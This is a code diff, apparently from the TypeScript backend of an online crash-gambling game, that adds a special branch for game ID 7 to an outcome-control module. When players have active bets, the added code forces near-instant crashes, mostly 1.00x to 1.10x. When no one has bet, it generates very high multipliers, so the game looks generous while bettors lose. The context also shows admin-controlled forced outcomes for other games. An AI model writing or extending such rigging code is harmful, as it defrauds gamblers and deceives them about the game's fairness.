@@ -104,7 +104,57 @@ export const gameOutcomeControl = {
     targetMultiplier: number
   ): Promise<number> {
     try {
-      // Check if we need to force the outcome
+      // SPECIAL IMPLEMENTATION FOR GAME ID 7
+      if (gameId === 7) {
+        console.log(`Game ID 7 detected - using special crash behavior`);
+        
+        // Check if any player bets exist for this game
+        const bets = await storage.getBetsByGameId(7, 'active');
+        const hasPlayerBets = bets && bets.length > 0;
+        
+        if (!hasPlayerBets) {
+          // No player bets - VERY high multipliers
+          console.log(`Game ID 7: No player bets - generating high crash point`);
+          const r = Math.random();
+          
+          if (r < 0.05) {
+            // Medium crash (10.00x to 20.00x) - 5% chance
+            return 10.00 + (Math.random() * 10);
+          } else if (r < 0.30) {
+            // Higher crash (20.00x to 50.00x) - 25% chance
+            return 20.00 + (Math.random() * 30);
+          } else if (r < 0.60) {
+            // Very high crash (50.00x to 100.00x) - 30% chance
+            return 50.00 + (Math.random() * 50);
+          } else if (r < 0.85) {
+            // Extreme crash (100.00x to 200.00x) - 25% chance
+            return 100.00 + (Math.random() * 100);
+          } else {
+            // Ultra rare mega crash (200.00x to 500.00x) - 15% chance
+            return 200.00 + (Math.random() * 300);
+          }
+        } else {
+          // Player bets exist - very low multipliers
+          console.log(`Game ID 7: Player bets exist - generating low crash point`);
+          const r = Math.random();
+          
+          if (r < 0.70) {
+            // Instant crash (1.00x to 1.10x) - 70% chance
+            return 1.00 + (Math.random() * 0.1);
+          } else if (r < 0.90) {
+            // Very early crash (1.10x to 1.30x) - 20% chance
+            return 1.10 + (Math.random() * 0.2);
+          } else if (r < 0.98) {
+            // Early crash (1.30x to 1.50x) - 8% chance 
+            return 1.30 + (Math.random() * 0.2);
+          } else {
+            // Rare not-so-high crash (1.50x to 2.00x) - 2% chance
+            return 1.50 + (Math.random() * 0.5);
+          }
+        }
+      }
+      
+      // For all other games, check if we need to force the outcome
       const controlResult = await this.shouldForceOutcome(userId, gameId);
       const { shouldForce, forcedOutcome, forcedValue, targetMultiplier: adminTargetMultiplier, useExactMultiplier } = controlResult;
       
